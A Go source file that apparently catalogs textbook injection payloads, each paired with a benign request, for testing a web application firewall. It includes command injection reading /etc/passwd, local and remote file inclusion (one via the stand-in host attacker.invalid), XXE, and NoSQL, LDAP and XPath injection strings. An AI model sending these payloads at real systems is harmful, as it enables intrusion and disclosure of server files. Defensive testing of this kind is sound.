package wafcatalog

// This file is additive to catalog_injection.go: six families named as gaps
// against Cymulate's reported WAF coverage (command injection, local/remote
// file inclusion, XXE, NoSQL injection, LDAP injection, XPath injection).
// Every payload here is a textbook OWASP WSTG / PayloadsAllTheThings-style
// string, matching catalog_injection.go's own SQLI-00x/XSS-00x style exactly
// -- no live exploitation chain, no callback infrastructure, no CVE-specific
// exploit (that is a separate, deferred catalog -- see the CVE catalog item
// in the WAF mastery QA log).

func commandInjectionVectors() ([]AttackVector, error) {
	var out []AttackVector

	benign1 := RequestTemplate{Method: "POST", Path: "/ping", PayloadLocation: "body:json:host", Payload: "8.8.8.8", Description: "ordinary host to ping"}
	v1, err := NewAttackVector("CMDI-001", 1, FamilyCommandInjection, "OS command injection via a diagnostic ping endpoint", SeverityCritical,
		"target exposes a network-diagnostic endpoint that shells out to the OS ping command with a user-supplied host",
		RequestTemplate{Method: "POST", Path: "/ping", PayloadLocation: "body:json:host", Payload: "8.8.8.8; cat /etc/passwd", Description: "command chaining attempting to execute an arbitrary command after the intended ping argument"},
		&benign1, "", StandardsMapping{CWEIDs: []string{"CWE-78"}, WSTGCategory: "WSTG-INPV-12", Top10Category: "A03:2021-Injection"},
		"manually authored from CWE-78 / OWASP WSTG-INPV-12")
	if err != nil {
		return nil, err
	}
	out = append(out, v1)

	benign2 := RequestTemplate{Method: "GET", Path: "/convert", PayloadLocation: "query:file", Payload: "report.docx", Description: "ordinary filename for a document-conversion request"}
	v2, err := NewAttackVector("CMDI-002", 1, FamilyCommandInjection, "Command injection via backtick/subshell substitution in a conversion filename", SeverityCritical,
		"target's document-conversion endpoint passes a filename parameter into a shell command without sanitization",
		RequestTemplate{Method: "GET", Path: "/convert", PayloadLocation: "query:file", Payload: "report.docx`id`", Description: "subshell substitution attempting command execution via backticks embedded in a filename parameter"},
		&benign2, "", StandardsMapping{CWEIDs: []string{"CWE-78"}, WSTGCategory: "WSTG-INPV-12", Top10Category: "A03:2021-Injection"},
		"manually authored from CWE-78 / OWASP WSTG-INPV-12")
	if err != nil {
		return nil, err
	}
	out = append(out, v2)

	return out, nil
}

func fileInclusionVectors() ([]AttackVector, error) {
	var out []AttackVector

	benign1 := RequestTemplate{Method: "GET", Path: "/page", PayloadLocation: "query:template", Payload: "home", Description: "ordinary named template for the page-rendering endpoint"}
	v1, err := NewAttackVector("LFI-001", 1, FamilyFileInclusion, "Local file inclusion via a page-template parameter using a PHP wrapper", SeverityCritical,
		"target's page-rendering endpoint passes a template name into an include() call without an allow-list",
		RequestTemplate{Method: "GET", Path: "/page", PayloadLocation: "query:template", Payload: "php://filter/convert.base64-encode/resource=../../../../etc/passwd", Description: "local file inclusion attempting to read a server file through a PHP stream wrapper"},
		&benign1, "", StandardsMapping{CWEIDs: []string{"CWE-98"}, WSTGCategory: "WSTG-INPV-11", Top10Category: "A03:2021-Injection"},
		"manually authored from CWE-98 / OWASP WSTG-INPV-11")
	if err != nil {
		return nil, err
	}
	out = append(out, v1)

	benign2 := RequestTemplate{Method: "GET", Path: "/widget", PayloadLocation: "query:lang", Payload: "en", Description: "ordinary language-pack selector"}
	v2, err := NewAttackVector("RFI-001", 1, FamilyFileInclusion, "Remote file inclusion via a language-pack selector", SeverityCritical,
		"target's localization loader fetches a language-pack path built from a user-supplied selector with no scheme or host restriction",
		RequestTemplate{Method: "GET", Path: "/widget", PayloadLocation: "query:lang", Payload: "http://attacker.invalid/shell.txt", Description: "remote file inclusion attempting to load attacker-hosted content via a language-pack path that accepts an external URL"},
		&benign2, "", StandardsMapping{CWEIDs: []string{"CWE-98"}, WSTGCategory: "WSTG-INPV-11", Top10Category: "A03:2021-Injection"},
		"manually authored from CWE-98 / OWASP WSTG-INPV-11")
	if err != nil {
		return nil, err
	}
	out = append(out, v2)

	return out, nil
}

func xxeVectors() ([]AttackVector, error) {
	var out []AttackVector

	benign1 := RequestTemplate{Method: "POST", Path: "/orders/import", PayloadLocation: "body:xml", Payload: "<order><item>SKU-1001</item><qty>2</qty></order>", Description: "ordinary order-import XML document"}
	v1, err := NewAttackVector("XXE-001", 1, FamilyXXE, "XML external entity injection via an order-import endpoint", SeverityCritical,
		"target parses uploaded XML with external entity resolution enabled",
		RequestTemplate{Method: "POST", Path: "/orders/import", PayloadLocation: "body:xml", Payload: "<!DOCTYPE order [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><order><item>&xxe;</item></order>", Description: "XXE attempting local file disclosure via a SYSTEM external entity declared in the document type"},
		&benign1, "", StandardsMapping{CWEIDs: []string{"CWE-611"}, WSTGCategory: "WSTG-INPV-07", Top10Category: "A05:2021-Security Misconfiguration"},
		"manually authored from CWE-611 / OWASP WSTG-INPV-07")
	if err != nil {
		return nil, err
	}
	out = append(out, v1)

	return out, nil
}

func noSQLInjectionVectors() ([]AttackVector, error) {
	var out []AttackVector

	benign1 := RequestTemplate{Method: "POST", Path: "/login", PayloadLocation: "body:json:username", Payload: "jane.doe", Description: "ordinary login username, a plain string"}
	v1, err := NewAttackVector("NOSQLI-001", 1, FamilyNoSQLInjection, "NoSQL operator injection via a JSON login field", SeverityCritical,
		"target's login endpoint passes the username field directly into a MongoDB query filter without type-checking it as a plain string",
		RequestTemplate{Method: "POST", Path: "/login", PayloadLocation: "body:json:username", Payload: `{"$gt": ""}`, Description: "NoSQL injection attempting authentication bypass via a MongoDB $gt operator submitted in place of a plain username string"},
		&benign1, "", StandardsMapping{CWEIDs: []string{"CWE-943"}, WSTGCategory: "WSTG-INPV-05", Top10Category: "A03:2021-Injection"},
		"manually authored from CWE-943 / OWASP WSTG-INPV-05")
	if err != nil {
		return nil, err
	}
	out = append(out, v1)

	return out, nil
}

func ldapInjectionVectors() ([]AttackVector, error) {
	var out []AttackVector

	benign1 := RequestTemplate{Method: "POST", Path: "/directory/search", PayloadLocation: "body:json:uid", Payload: "jsmith", Description: "ordinary directory username to search for"}
	v1, err := NewAttackVector("LDAPI-001", 1, FamilyLDAPInjection, "LDAP filter injection via a directory-search username field", SeverityHigh,
		"target builds an LDAP search filter by concatenating a user-supplied username without escaping LDAP filter metacharacters",
		RequestTemplate{Method: "POST", Path: "/directory/search", PayloadLocation: "body:json:uid", Payload: "*)(uid=*))(|(uid=*", Description: "LDAP filter injection attempting to widen a directory search via unescaped filter metacharacters"},
		&benign1, "", StandardsMapping{CWEIDs: []string{"CWE-90"}, WSTGCategory: "WSTG-INPV-06", Top10Category: "A03:2021-Injection"},
		"manually authored from CWE-90 / OWASP WSTG-INPV-06")
	if err != nil {
		return nil, err
	}
	out = append(out, v1)

	return out, nil
}

func xpathInjectionVectors() ([]AttackVector, error) {
	var out []AttackVector

	benign1 := RequestTemplate{Method: "POST", Path: "/account/lookup", PayloadLocation: "body:json:user", Payload: "jsmith", Description: "ordinary account username to look up"}
	v1, err := NewAttackVector("XPATHI-001", 1, FamilyXPathInjection, "XPath injection via an account-lookup username field", SeverityHigh,
		"target builds an XPath query against an XML-backed account store by concatenating a user-supplied username",
		RequestTemplate{Method: "POST", Path: "/account/lookup", PayloadLocation: "body:json:user", Payload: "' or '1'='1", Description: "XPath injection attempting to bypass an account-lookup predicate via an OR-tautology"},
		&benign1, "", StandardsMapping{CWEIDs: []string{"CWE-643"}, WSTGCategory: "WSTG-INPV-09", Top10Category: "A03:2021-Injection"},
		"manually authored from CWE-643 / OWASP WSTG-INPV-09")
	if err != nil {
		return nil, err
	}
	out = append(out, v1)

	return out, nil
}
